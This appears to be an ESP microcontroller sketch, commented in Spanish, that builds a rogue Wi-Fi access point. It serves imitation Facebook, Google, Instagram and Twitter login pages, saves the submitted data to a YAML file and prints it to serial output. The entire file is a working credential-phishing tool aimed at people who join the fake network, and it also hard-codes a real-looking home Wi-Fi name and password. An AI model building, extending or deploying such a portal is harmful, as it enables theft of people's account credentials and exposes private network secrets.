#include <FakeAPlib.h>


//variable para el nombre del wifi
const char* SSID   = "ESP.local-server";
const char* PASS   = "SECUREhash9361";
const char* WIFI_SSID = "Finetwork_82FBD";
const char* WIFI_PSW  = "2c2D4GeA";

const char* DATA_FILE = "/data/data.yaml";
const char* AUTH_PAGE = "/webpages/index.html";
const char* THKS_PAGE = "/webpages/thanksPage.html";

const char* FB_PATH = "/webpages/facebook-login";
const char* GL_PATH = "/webpages/google-login";
const char* IS_PATH = "/webpages/instagram-login";
const char* TW_PATH = "/webpages/twitter-login";

//IPAddress apip(192,168,1,1);
const IPAddress* serverip = new IPAddress(10,10,1,1);
//byte apmac[6];

FakeAp* accessPoint = new FakeAp(80);
int printed = 0;

void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Loading....");
  delay(1000);

  Serial.println("File dir test: ");
  Serial.println(SDCardManager::getFileDir(THKS_PAGE));
  
  accessPoint->setPath(AUTH_PAGE, INDEXPAGE);
  accessPoint->setPath(THKS_PAGE, EXITPAGE);
  accessPoint->setPath(DATA_FILE, DATAFILE);

  accessPoint->setPath(FB_PATH, FACEBOOK);
  accessPoint->setPath(GL_PATH, GOOGLE);
  accessPoint->setPath(IS_PATH, INSTAGRAM);
  accessPoint->setPath(TW_PATH, TWITTER);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 0, 0));
  if (!accessPoint->initialize(SSID, PASS))
    Serial.println("Error en la configuración del punto de acceso");


  WiFi.hostname("ESP.server");
  if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
    Serial.println("Conexión a la wifi fallada.");

  Serial.println("Config done!");
  
}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    accessPoint->printFilesContent();
    printed++;
  }

}
